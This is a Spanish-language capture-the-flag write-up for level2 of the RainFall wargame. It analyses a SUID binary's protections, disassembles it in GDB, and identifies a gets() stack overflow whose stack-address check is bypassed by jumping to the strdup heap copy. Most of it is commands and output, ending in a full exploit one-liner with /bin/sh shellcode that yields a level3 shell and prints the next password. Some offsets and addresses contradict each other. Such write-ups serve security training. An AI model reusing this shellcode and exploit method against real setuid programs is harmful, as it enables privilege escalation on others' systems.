# 1. Buscar Binario:

Listamos los archivos para que nos muestre el binario del 'level2' y sus permisos. 

```
level2@RainFall:~$ ls -la
total 17
dr-xr-x---+ 1 level2 level2   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level2 level2  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level2 level2 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 level3 users  5403 Mar  6  2016 level2
-rw-r--r--+ 1 level2 level2   65 Sep 23  2015 .pass
-rw-r--r--  1 level2 level2  675 Apr  3  2012 .profile
```

> **Nota:** El bit `s` en los permisos indica que es un binario **SUID**. Se ejecutará con los privilegios del propietario (`level3`).

---

# 2. Analizamos las protecciones de la RAM

### a). PIE;
```
level2@RainFall:~$ file ./level2 
./level2: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x0b5bb6cdcf572505f066c42f7be2fde7c53dc8bc, not stripped
```

### b). ASLR:
```
level2@RainFall:~$ cat /proc/sys/kernel/randomize_va_space 
0
```

### c). NX y RELRO:
```
level2@RainFall:~$ readelf -l ./level2 | grep -E "(STACK|RELRO)"
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x4
```

### d). STACK CANARY:
```
level2@RainFall:~$ nm ./level2 
bash: /usr/bin/nm: Input/output error
```

### e). `.got` y `.plt`:
```
level2@RainFall:~$ readelf -S ./level2 | grep -E "(.got|.plt)"
  [10] .rel.plt          REL             08048318 000318 000040 08   A  5  12  4
  [12] .plt              PROGBITS        08048390 000390 000090 04  AX  0   0 16
  [22] .got              PROGBITS        08049824 000824 000004 04  WA  0   0  4
  [23] .got.plt          PROGBITS        08049828 000828 00002c 04  WA  0   0  4
```

---

# 3. Resumen del análisis:

| Protección | Estado | Evidencia | Consecuencias |
| --- | --- | --- | --- |
| **PIE** | **OFF** | `executable` | El binario siempre carga en `0x08048000` |
| **ASLR** | **OFF** | `0` | Las direcciones de librerías y stack son constantes. |
| **NX** | **OFF** | `GNU_STACK RWE` | Si podemos ejecutar código (ShellCode) en el Stack |
| **RELRO** | **OFF** | `No RELRO ` | La tabla GOT puede ser sobrescrita. |
| **CANARY** | **? ? ?**  | `error` | Buscar con `gdb` |
| **.got.plt** | **WA**  | `WA` | Confirma sección `.got` en escritura |

---

# 4. Fuzzing:

Probamos diferentes maneras de ejecutar el binario hasta lograr romperlo:

```
level2@RainFall:~$ ./level2 
hola
hola
level2@RainFall:~$ ./level2 hiola
jlk
jlk
level2@RainFall:~$ ./level2 
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Segmentation fault (core dumped)
./level2
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaJ����

```

* El binairo `level2` mantiene abierta una shell y copia la cadena de caracteres que se introducen en el terminal `stdin`. Genera un error de `segfault` en la salida de la copia de la cadena.

# 5. Reverse Engineering (Target Identification):

```
level2@RainFall:~$ gdb ./level1 
(gdb) set disassembly-flavor intel
(gdb) disas main

Dump of assembler code for function main:
   0x0804853f <+0>:	    push   ebp
   0x08048540 <+1>:	    mov    ebp,esp
   0x08048542 <+3>:	    and    esp,0xfffffff0
   0x08048545 <+6>:	    call   0x80484d4 <p>
   0x0804854a <+11>:	leave  
   0x0804854b <+12>:	ret    
End of assembler dump.

(gdb) disas p
Dump of assembler code for function p:
   0x080484d4 <+0>:     push   ebp
   0x080484d5 <+1>:	    mov    ebp,esp
   0x080484d7 <+3>:	    sub    esp,0x68
   0x080484da <+6>:	    mov    eax,ds:0x8049860
   0x080484df <+11>:	mov    DWORD PTR [esp],eax
   0x080484e2 <+14>:	call   0x80483b0 <fflush@plt>
   0x080484e7 <+19>:	lea    eax,[ebp-0x4c]
   0x080484ea <+22>:	mov    DWORD PTR [esp],eax
   0x080484ed <+25>:	call   0x80483c0 <gets@plt>
   0x080484f2 <+30>:	mov    eax,DWORD PTR [ebp+0x4]
   0x080484f5 <+33>:	mov    DWORD PTR [ebp-0xc],eax
   0x080484f8 <+36>:	mov    eax,DWORD PTR [ebp-0xc]
   0x080484fb <+39>:	and    eax,0xb0000000
   0x08048500 <+44>:	cmp    eax,0xb0000000
   0x08048505 <+49>:	jne    0x8048527 <p+83>
   0x08048507 <+51>:	mov    eax,0x8048620
   0x0804850c <+56>:	mov    edx,DWORD PTR [ebp-0xc]
   0x0804850f <+59>:	mov    DWORD PTR [esp+0x4],edx
   0x08048513 <+63>:	mov    DWORD PTR [esp],eax
   0x08048516 <+66>:	call   0x80483a0 <printf@plt>
   0x0804851b <+71>:	mov    DWORD PTR [esp],0x1
   0x08048522 <+78>:	call   0x80483d0 <_exit@plt>
   0x08048527 <+83>:	lea    eax,[ebp-0x4c]
   0x0804852a <+86>:	mov    DWORD PTR [esp],eax
   0x0804852d <+89>:	call   0x80483f0 <puts@plt>
   0x08048532 <+94>:	lea    eax,[ebp-0x4c]
   0x08048535 <+97>:	mov    DWORD PTR [esp],eax
   0x08048538 <+100>:	call   0x80483e0 <strdup@plt>
   0x0804853d <+105>:	leave  
   0x0804853e <+106>:	ret    
End of assembler dump.

```

Para ver con detalle el analisis consuta el archivo  [asm_analysis.md](https://github.com/4trastos/Rainfall/blob/main/level2/Resources/README.md) en conjunto con el programa de demostración  [source.c](https://github.com/4trastos/Rainfall/blob/main/level2/source.c).

---

# 6. Solución:

1. Tras analizar el desensamblado en el punto anterior, intuimos que el posible desbordamiento del stack se tienen que producir dentro de la función `p`.

```asm
0x08048545 <+6>:	    call   0x80484d4 <p>    ⟸
0x0804854a <+11>:	    leave  
```

2. Al listar las funciones en GDB (`info functions`), localizamos la función `p` que es llamada en el código y que es dentro de esa función `p` donde se lee y se realiza la copia:

```
All defined functions:

Non-debugging symbols:
0x08048358  _init
0x080483a0  printf
0x080483a0  printf@plt
0x080483b0  fflush
0x080483b0  fflush@plt
0x080483c0  gets                    ⟸
0x080483c0  gets@plt
0x080483d0  _exit
0x080483d0  _exit@plt
0x080483e0  strdup                  ⟸
0x080483e0  strdup@plt
0x080483f0  puts
0x080483f0  puts@plt
0x08048400  __gmon_start__
0x08048400  __gmon_start__@plt
0x08048410  __libc_start_main
0x08048410  __libc_start_main@plt
0x08048420  _start
0x08048450  __do_global_dtors_aux
0x080484b0  frame_dummy
0x080484d4  p                         ⟸
0x0804853f  main
0x08048550  __libc_csu_init
0x080485c0  __libc_csu_fini
0x080485c2  __i686.get_pc_thunk.bx
0x080485d0  __do_global_ctors_aux
0x080485fc  _fini
```

3. **Identificamos el BACKDOOR**
Analizamos el desamblado de la función `p` e identificamos que hay una comprobación diseñada para evitar que hagamos lo mismo que en el Level 1.

```asm
0x080484fb <+39>:    and    eax,0xb0000000
0x08048500 <+44>:    cmp    eax,0xb0000000
0x08048505 <+49>:    jne    0x8048527 <p+83>

```
* El programa verifica si el EIP ha sido alterado para apuntar al Stack.
* Si `(EIP & 0xb0000000) == 0xb0000000`, el programa asume un ataque y aborta.
* **Esto impide ejecutar Shellcode directamente desde el buffer del Stack.**


```asm
0x08048538 <+100>:  call   0x80483e0 <strdup@plt>

```
* Aquí está la **brecha**. El programa hace un `strdup` del buffer.
* `strdup` reserva memoria en el **Heap**.
* Las direcciones del Heap **no empiezan por `0xb**` (suelen empezar por `0x08`).
* **El Plan:** Como el filtro solo bloquea el Stack, saltaremos a la copia de nuestra cadena que vive en el Heap.


* **Objetivo:** `strdup()` Duplica la cadena introducida en el **Heap**. Dado que el Heap es ejecutable (`NX disabled`) y su dirección (`0x08......`) sobrepasa el filtro `0xb0000000`, este es nuestro punto de entrada.

## **MAPA VISUAL DEL STACK EN `p()**`

| Dirección | Contenido | Tamaño |
| --- | --- | --- |
| **`ebp + 0x04`** | **RET (EIP)** | 4 bytes |
| **`ebp + 0x00`** | **EBP Viejo** | 4 bytes |
| ... | *Espacio interno* | ... |
| **`ebp - 0x4c`** | **INICIO BUFFER** | **76 bytes** (0x4c) |

4. **Cáculo del PAyload (OFFSET):**
Para tomar el control del EIP, debemos llenar el stack hasta alcanzar la dirección de retorno:

1. **Buffer útil:** 104 bytes (hasta el final de la reserva local).
2. **Padding/Alineación:** Buffer (76) + EBP (4) = 80 bytes. Si el Shellcode mide 23 bytes, necesitamos 80−23=57 bytes de basura.
3. **EBP Viejo:** 4 bytes.
4. **EIP (Retorno):** Aquí inyectamos nuestra dirección. Debe ser la dirección del Heap donde `strdup` guarda la copia.


4. **Cálculo total de caracteres basura (Padding):**
bytes.

| Offset | Contenido | Valor |
| --- | --- | --- |
| **80 - 23** | Basura | "A" * 57 |
| **21 - 25** | **Nuevo EIP** | `\x08\xa0\x04\x08` (La dirección del `Heap` en Little Endian) |

5. **Análisis de protecciones:**

* **NX: OFF** -> Podríamos usar Shellcode
* **ASLR: OFF** -> La dirección `0x08048444` es estática y no cambia.

6. **Ejecución del Exploit:**
```bash
level2@RainFall:~$ (printf '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80'; printf 'A%.0s' {1..57}; printf '\x08\xa0\x04\x08'; echo; cat) | ./level2
1�Ph//shh/bin����°
                  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
id
uid=2021(level2) gid=2021(level2) euid=2022(level3) egid=100(users) groups=2022(level3),100(users),2021(level2)
whoami
level3
cd ..
pwd
/home/user
cd level3
pwd
/home/user/level3
ls -la
total 17
dr-xr-x---+ 1 level3 level3   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level3 level3  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level3 level3 3530 Sep 23  2015 .bashrc
-rw-r--r--+ 1 level3 level3   65 Sep 23  2015 .pass
-rw-r--r--  1 level3 level3  675 Apr  3  2012 .profile
-rwsr-s---+ 1 level4 users  5366 Mar  6  2016 level3
cat .pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
^C
level2@RainFall:~$ su level3
Password: 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level3/level3
level3@RainFall:~$ 

```

----

# 7. Conclusión:

El **Level 2** representa un salto cualitativo en dificultad al introducir una **comprobación de integridad del flujo de ejecución**. A diferencia del nivel anterior, el binario implementa un filtro dinámico que inspecciona la dirección de retorno (`EIP`) antes de permitir la salida de la función `p`.

La seguridad se basa en la premisa de que un atacante intentará saltar al **Stack** (direcciones `0xbf...`) para ejecutar su Shellcode. Al aplicar una máscara binaria `0xb0000000`, el programa detecta y aborta cualquier intento de ejecución en esa región de memoria.

Sin embargo, el diseño del programa introduce una vulnerabilidad lógica al utilizar `strdup()`. Esta función replica el input malicioso en el **Heap**, una zona de memoria que:

1. Posee permisos de ejecución (**NX Disabled**).
2. Utiliza direcciones fuera del rango filtrado (típicamente `0x08...`).

Las protecciones parciales pueden ser evitadas mediante el uso de "trampolines" de memoria o regiones alternativas donde las políticas de seguridad son más laxas.
